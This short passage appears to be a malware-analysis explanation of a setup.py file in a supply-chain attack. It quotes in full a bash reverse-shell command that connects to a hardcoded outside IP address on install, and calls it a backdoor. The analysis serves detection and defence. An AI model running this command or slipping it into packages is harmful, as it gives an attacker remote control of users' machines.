The command '/bin/bash -c '/bin/bash -i >& /dev/tcp/120.55.57.148/8080 0>&1'' attempts to establish a connection to the IP address 120.55.57.148 on port 8080, which is indicative of a reverse shell attack. This behavior is hidden within a setup.py file, which is a common tactic in supply chain attacks to execute malicious code during package installation."

This behavior is indicative of a remote access trojan (RAT) or backdoor, which allows an attacker to gain unauthorized control over the victim's system. The use of hardcoded IP addresses and the immediate execution of a network-connected shell without user consent are clear signs of malicious intent. This pattern is exclusively observed in malware samples and is never present in benign software."
